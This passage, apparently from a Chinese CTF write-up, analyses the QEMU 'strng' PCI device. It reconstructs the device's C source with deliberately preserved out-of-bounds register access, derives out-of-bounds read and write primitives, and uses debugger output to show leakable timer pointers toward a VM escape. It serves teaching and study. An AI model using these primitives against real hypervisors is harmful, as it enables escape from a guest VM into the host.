class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hw/misc/strng.c - logically equivalent to the decompiled code, with symbols restored */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/osdep.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/timer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qom/object.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/pci/pci.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;exec/memory.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_STRNG <span class="string">&quot;strng&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG(obj) OBJECT_CHECK(STRNGState, (obj), TYPE_STRNG)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Device state */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">STRNGState</span> &#123;</span></span><br><span class="line">    <span class="comment">/* QOM/PCI base */</span></span><br><span class="line">    PCIDevice   pdev;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Regions */</span></span><br><span class="line">    MemoryRegion mmio;   <span class="comment">/* size 0x100 */</span></span><br><span class="line">    MemoryRegion pmio;   <span class="comment">/* size 0x8   */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Registers and state (layout/semantics match the decompiled code) */</span></span><br><span class="line">    <span class="type">uint32_t</span>    addr;    <span class="comment">/* PMIO &quot;indirect address&quot; register */</span></span><br><span class="line">    <span class="type">uint32_t</span>    flag;</span><br><span class="line">    <span class="type">uint32_t</span>    regs[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Timer immediately after regs in the original layout */</span></span><br><span class="line">    QEMUTimer   strng_timer;</span><br><span class="line">&#125; STRNGState;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- Forward decls --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_instance_init</span><span class="params">(Object *obj)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_timer</span><span class="params">(<span class="type">void</span> *opaque)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_uninit</span><span class="params">(PCIDevice *pdev)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">strng_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>     <span class="title function_">strng_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">strng_pmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>     <span class="title function_">strng_pmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- MMIO / PMIO ops --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_mmio_ops = &#123;</span><br><span class="line">    .read = strng_mmio_read,</span><br><span class="line">    .write = strng_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_pmio_ops = &#123;</span><br><span class="line">    .read = strng_pmio_read,</span><br><span class="line">    .write = strng_pmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- Timer callback (keeps exact semantics) --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_timer</span><span class="params">(<span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *s = opaque;</span><br><span class="line">    s-&gt;flag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- PMIO: 8 bytes: [0]=addr, [4]=data (indirect) --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_pmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* Set indirect address register; no bounds check, preserves bug */</span></span><br><span class="line">            s-&gt;addr = (<span class="type">uint32_t</span>)val;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (addr == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="comment">/* Data port: requires indirect addr 4-byte aligned */</span></span><br><span class="line">            <span class="keyword">if</span> ((s-&gt;addr &amp; <span class="number">3</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">uint32_t</span> index = s-&gt;addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (index == <span class="number">1</span>) &#123;</span><br><span class="line">                    s-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (index == <span class="number">3</span>) &#123;</span><br><span class="line">                        s-&gt;regs[<span class="number">3</span>] = rand_r(&amp;s-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">/* OOB write preserved: no check that index &lt; 64 */</span></span><br><span class="line">                        s-&gt;regs[index] = (<span class="type">uint32_t</span>)val;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (s-&gt;flag) &#123;</span><br><span class="line">                            <span class="type">int64_t</span> now = qemu_clock_get_ms(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">                            timer_mod(&amp;s-&gt;strng_timer, now + <span class="number">100</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">/* index == 0 */</span></span><br><span class="line">                    srand((<span class="type">unsigned</span>)val);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* any other PMIO addr: do nothing (as in the decompiled code) */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* sizes other than 4 are ignored for writes */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> strng_pmio_read(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (addr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* Read back indirect address register */</span></span><br><span class="line">        <span class="keyword">return</span> s-&gt;addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (addr == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">/* Data port read: requires 4-byte aligned indirect address */</span></span><br><span class="line">        <span class="keyword">if</span> ((s-&gt;addr &amp; <span class="number">3</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* OOB read preserved: no check that (s-&gt;addr&gt;&gt;2) &lt; 64 */</span></span><br><span class="line">        <span class="keyword">return</span> s-&gt;regs[s-&gt;addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- MMIO: 0x100 bytes, direct indexed by offset/4 --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *s = opaque;</span><br><span class="line">    <span class="type">uint32_t</span> seed = (<span class="type">uint32_t</span>)val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">4</span> &amp;&amp; ((addr &amp; <span class="number">3</span>) == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> index = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (index == <span class="number">1</span>) &#123;</span><br><span class="line">            s-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (index == <span class="number">3</span>) &#123;</span><br><span class="line">                s-&gt;regs[<span class="number">3</span>] = rand_r(&amp;s-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;flag = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">/* direct write (within MMIO region size, so index in [0..63]) */</span></span><br><span class="line">            s-&gt;regs[index] = seed;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* index == 0 */</span></span><br><span class="line">            srand((<span class="type">unsigned</span>)val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* invalid size or unaligned: ignored */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> strng_mmio_read(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">4</span> &amp;&amp; ((addr &amp; <span class="number">3</span>) == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="comment">/* region is 0x100, so addr&gt;&gt;2 in [0..63] when called by QEMU core */</span></span><br><span class="line">        <span class="keyword">return</span> s-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- PCI realize/uninit --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_uninit</span><span class="params">(PCIDevice *pdev)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *s = STRNG(pdev);</span><br><span class="line">    timer_del(&amp;s-&gt;strng_timer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *s = STRNG(pdev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* timer: QEMU virtual clock, cb=strng_timer, opaque=s */</span></span><br><span class="line">    timer_init_ms(&amp;s-&gt;strng_timer, QEMU_CLOCK_VIRTUAL, strng_timer, s);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* MMIO BAR0: 0x100 bytes */</span></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mmio, OBJECT(pdev), &amp;strng_mmio_ops, s,</span><br><span class="line">                          <span class="string">&quot;strng-mmio&quot;</span>, <span class="number">0x100</span>);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;mmio);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* PMIO BAR1: 8 bytes */</span></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;pmio, OBJECT(pdev), &amp;strng_pmio_ops, s,</span><br><span class="line">                          <span class="string">&quot;strng-pmio&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;s-&gt;pmio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- QOM init/class init --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *s = STRNG(obj);</span><br><span class="line">    <span class="comment">/* exactly as in the decompiled code: only flag is explicitly zeroed here */</span></span><br><span class="line">    s-&gt;flag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(oc);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize   = pci_strng_realize;</span><br><span class="line">    k-&gt;<span class="built_in">exit</span>      = pci_strng_uninit;</span><br><span class="line">    k-&gt;vendor_id = <span class="number">0x1234</span>;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11E9</span>;</span><br><span class="line">    k-&gt;revision  = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id  = PCI_CLASS_OTHERS; <span class="comment">/* 0xFF */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- Type registration --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo strng_info = &#123;</span><br><span class="line">    .name          = TYPE_STRNG,</span><br><span class="line">    .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(STRNGState),</span><br><span class="line">    .instance_init = strng_instance_init,</span><br><span class="line">    .class_init    = strng_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    type_register_static(&amp;strng_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type_init(pci_strng_register_types)</span><br></pre></td></tr></table></figure></div>

<p>设备读写函数分析如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strng_mmio_read(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size);</span><br></pre></td></tr></table></figure></div>

<ul>
<li>条件：<code>size==4</code> 且 <code>addr%4==0</code>，否则返回 <code>-1</code>。</li>
<li>返回：<code>regs[addr&gt;&gt;2]</code>。由于 BAR0 长度被固定为 <code>0x100</code>，QEMU 只会把 <code>addr in [0,0xFC]</code> 的访问转进来，因此 <strong>无越界</strong>。</li>
</ul>
<hr>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strng_mmio_write(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size);</span><br></pre></td></tr></table></figure></div>

<p>前置：<code>size==4</code> 且 <code>addr%4==0</code>，令 <code>idx=addr&gt;&gt;2</code></p>
<ul>
<li><code>idx==0</code>（<code>addr==0</code>）：<code>srand(val)</code></li>
<li><code>idx==1</code>（<code>addr==4</code>）：<code>regs[1] = rand()</code>（<strong>不会</strong>置 <code>flag</code>）</li>
<li><code>idx==3</code>（<code>addr==12</code>）：先 <code>regs[3] = rand_r(&amp;regs[2])</code>，<strong>再</strong> <code>flag=1; regs[3] = (uint32_t)val</code>（随机数被覆盖，<code>regs[2]</code> 的种子被 <code>rand_r</code> 更新）</li>
<li>其他 <code>idx in &#123;2,4..63&#125;</code>：<code>flag=1; regs[idx]=(uint32_t)val</code>，依赖 BAR0&#x3D;0x100 的边界，<strong>不会越界</strong>。</li>
</ul>
<hr>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strng_pmio_read(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size);</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>若 <code>size!=4</code>：返回 <code>-1</code></p>
</li>
<li><p>若 <code>addr==0</code>：返回 **<code>opaque-&gt;addr</code>**（索引寄存器）</p>
</li>
<li><p>若 <code>addr==4</code>：</p>
<ul>
<li>若 <code>opaque-&gt;addr%4!=0</code>：返回 <code>-1</code></li>
<li>否则返回 <strong><code>regs[opaque-&gt;addr &gt;&gt; 2]</code><strong>（</strong>无上界检查 → 可越界读</strong>）</li>
</ul>
</li>
<li><p>其他 <code>addr</code>：返回 <code>-1</code></p>
</li>
</ul>
<hr>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strng_pmio_write(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size);</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>仅关心 <code>size==4</code></p>
</li>
<li><p><code>addr==0</code>：<strong>索引寄存器写</strong> → <code>opaque-&gt;addr = (uint32_t)val</code>（只对齐在读&#x2F;写数据阶段检查，这里不归一化也不裁剪）</p>
</li>
<li><p><code>addr==4</code> 且 <strong><code>(opaque-&gt;addr &amp; 3) == 0</code></strong> 时：</p>
<ul>
<li><p>令 <code>idx = opaque-&gt;addr &gt;&gt; 2</code></p>
</li>
<li><p><code>idx==0</code>：<code>srand(val)</code></p>
</li>
<li><p><code>idx==1</code>：<code>regs[1] = rand()</code></p>
</li>
<li><p><code>idx==3</code>：<code>regs[3] = rand_r(&amp;regs[2])</code>（<strong>不会</strong>写入 <code>val</code>，也<strong>不会</strong>触发计时器）</p>
</li>
<li><p>其他 <code>idx</code>：<code>regs[idx] = (uint32_t)val</code>；若 <code>flag!=0</code>，则</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">now = qemu_clock_get_ms(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">timer_mod(&amp;strng_timer, now + <span class="number">100</span>);</span><br></pre></td></tr></table></figure></div>

<p>（<strong>无上界检查 → 可越界写</strong>；计时器仅在 <code>flag!=0</code> 时被安排）</p>
</li>
</ul>
</li>
<li><p>其他 <code>addr</code>：忽略（无效果）</p>
</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>越界读原语：</p>
<ol>
<li>利用 <code>mmio_read</code> 传递 <code>offset &lt;&lt; 2</code> 即可读取 <code>regs[offset]</code> 处的四字节值；</li>
<li>利用 <code>pmio_write</code> 设置 <code>opaque-&gt;addr = offset &lt;&lt; 2</code> ，调用 <code>pmio_read</code> 读取 <code>regs[offset]</code> 处的四字节<br>值；</li>
</ol>
<p>越界写原语：</p>
<ol>
<li>利用 <code>mmio_write</code> 传递 <code>offset &lt;&lt; 2</code> 即可写 <code>regs[offset]</code> 处的四字节值为 <code>val</code>；</li>
<li>利用 <code>pmio_write</code> 设置 <code>opaque-&gt;addr = offset &lt;&lt; 2</code> ，调用 <code>pmio_write</code> 写 <code>regs[offset]</code> 处的四字节<br>值为 <code>val</code>；</li>
</ol>
<p>设备在 <code>pci_strng_realize()</code> 里把 <strong>BAR0（MMIO）大小固定成 0x100 字节</strong>，并且 <code>MemoryRegionOps.valid</code> 也限定只允许 <strong>4 字节且 4 字节对齐</strong> 的访问。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* MMIO BAR0: 0x100 bytes */</span></span><br><span class="line">memory_region_init_io(&amp;s-&gt;mmio, OBJECT(pdev), &amp;strng_mmio_ops, s,</span><br><span class="line">                      <span class="string">&quot;strng-mmio&quot;</span>, <span class="number">0x100</span>);</span><br><span class="line">pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;mmio);</span><br></pre></td></tr></table></figure></div>

<p>调试发现 <code>STRNGState</code> 结构体的内容如下，其中 <code>strng_timer</code> 的 <code>cb</code> 和 <code>opaque</code> 分别可以泄露 qemu 和 <code>STRNGState</code> 地址。</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>p *(STRNGState*)0x555558d0d870
&dollar;1 = {
  pdev = {...},
  mmio = {...},
  pmio = {...},
  addr = 0,
  flag = 0,
  regs = {0 &lt;repeats 64 times&gt;},
  strng_timer = {
    expire_time = -1,
    timer_list = <font color="#3465A4">0x5555574dedd0</font>,
    cb = <font color="#3465A4">0x55555569ac8e</font> &lt;<font color="#C4A000">strng_timer</font>&gt;,
    opaque = <font color="#3465A4">0x555558d0d870</font>,
    next = <font color="#3465A4">0x0</font>,
    scale = 1000000
  }
}
<font color="#4E9A06"><b>pwndbg&gt; </b></font>telescope &amp;((STRNGState*)0x555558d0d870)-&gt;regs 40
00:0000│  <font color="#3465A4">0x555558d0e368</font> ◂— 0
... ↓     31 skipped
20:0100│  <font color="#3465A4">0x555558d0e468</font> ◂— 0xffffffffffffffff
21:0108│  <font color="#3465A4">0x555558d0e470</font> —▸ <font color="#3465A4">0x5555574dedd0</font> —▸ <font color="#75507B">0x555556475700 (qemu_clocks+32)</font> —▸ <font color="#3465A4">0x5555574df480</font> ◂— <font color="#75507B">0x555556475700 (qemu_clocks+32)</font>
22:0110│  <font color="#3465A4">0x555558d0e478</font> —▸ <font color="#CC0000">0x55555569ac8e (strng_timer)</font> ◂— <font color="#AFD700">push</font><font color="#EEEEEC"> </font><font color="#5FD7FF">rbp</font>
23:0118│  <font color="#3465A4">0x555558d0e480</font> —▸ <font color="#3465A4">0x555558d0d870</font> —▸ <font color="#3465A4">0x5555574ba8d0</font> —▸ <font color="#3465A4">0x555557451720</font> —▸ <font color="#3465A4">0x5555574518a0</font> ◂— ...
24:0120│  <font color="#3465A4">0x555558d0e488</font> ◂— 0
25:0128│  <font color="#3465A4">0x555558d0e490</font> ◂— 0xf4240
26:0130│  <font color="#3465A4">0x555558d0e498</font> ◂— 0
27:0138│  <font color="#3465A4">0x555558d0e4a0</font> ◂— 0</pre>

<p>如果考虑修改 <code>main_loop_tlg</code> 实现虚拟机逃逸，由于 <code>main_loop_tlg</code> 位于 qemu 上，地址小于堆地址，而越界写 <code>regs[opaque-&gt;addr &gt;&gt; 2] = val</code> 无法将下标设为负数，因此考虑其他方法。</p>
<p>在 <code>pci_strng_realize</code> 函数中有对 <code>strng_timer</code> 的初始化，这里 <code>QEMU_CLOCK_VIRTUAL = 1</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* timer: QEMU virtual clock, cb=strng_timer, opaque=s */</span></span><br><span class="line">timer_init_ms(&amp;s-&gt;strng_timer, QEMU_CLOCK_VIRTUAL, strng_timer, s);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><p><strong>创建并初始化一个 QEMU 定时器对象（一次性&#x2F;one-shot）</strong></p>
<ul>
<li>放在 <code>s-&gt;strng_timer</code> 里；</li>
<li>绑定 <strong>回调函数</strong> <code>strng_timer</code>；</li>
<li>回调的 <strong>参数</strong> 设置为设备实例 <code>s</code>；</li>
<li>当前是“<strong>未启动&#x2F;未计时</strong>”状态，只有后续 <code>timer_mod(...)</code> 才会真正“上闹钟”。</li>
</ul>
</li>
<li><p><strong>选择使用的时钟源是虚拟时钟 <code>QEMU_CLOCK_VIRTUAL</code></strong></p>
<ul>
<li>该时钟随<strong>来宾 CPU 的“虚拟时间”</strong>推进：来宾执行指令时才前进，暂停&#x2F;单步&#x2F;阻塞时 <strong>不会</strong> 走；</li>
<li>不等于宿主机墙钟，纯等 100ms 的宿主时间<strong>不一定</strong>触发它；要让来宾继续跑，虚拟时间才会过 100ms。</li>
</ul>
</li>
</ul>
</blockquote>
<p>该函数有如下调用链：</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>bt
#0  <font color="#C4A000">timer_init_tl</font> (<font color="#06989A">ts</font>=0x7fffffffd6a0, <font color="#06989A">timer_list</font>=0x5555558b107c &lt;pci_set_word+36&gt;, <font color="#06989A">scale</font>=32767, <font color="#06989A">cb</font>=0x555558d0f3a6, <font color="#06989A">opaque</font>=0xf90058d0f294) at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/qemu-timer.c</font>:336
#1  <font color="#3465A4">0x000055555569ac4f</font> in <font color="#C4A000">timer_init</font> (<font color="#06989A">ts</font>=0x555558d0e468, <font color="#06989A">type</font>=QEMU_CLOCK_VIRTUAL, <font color="#06989A">scale</font>=1000000, <font color="#06989A">cb</font>=0x55555569ac8e &lt;strng_timer&gt;, <font color="#06989A">opaque</font>=0x555558d0d870) at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/include/qemu/timer.h</font>:442
#2  <font color="#3465A4">0x000055555569ac8b</font> in <font color="#C4A000">timer_init_ms</font> (<font color="#06989A">ts</font>=0x555558d0e468, <font color="#06989A">type</font>=QEMU_CLOCK_VIRTUAL, <font color="#06989A">cb</font>=0x55555569ac8e &lt;strng_timer&gt;, <font color="#06989A">opaque</font>=0x555558d0d870) at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/include/qemu/timer.h</font>:499
#3  <font color="#3465A4">0x000055555569afe2</font> in <font color="#C4A000">pci_strng_realize</font> (<font color="#06989A">pdev</font>=0x555558d0d870, <font color="#06989A">errp</font>=0x7fffffffd708) at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/hw/misc/strng.c</font>:148</pre>
<p><code>timer_init_tl</code> 设置 <code>expire_time</code> 为 -1，因此不会回调 <code>cb</code> 函数指针。</p>
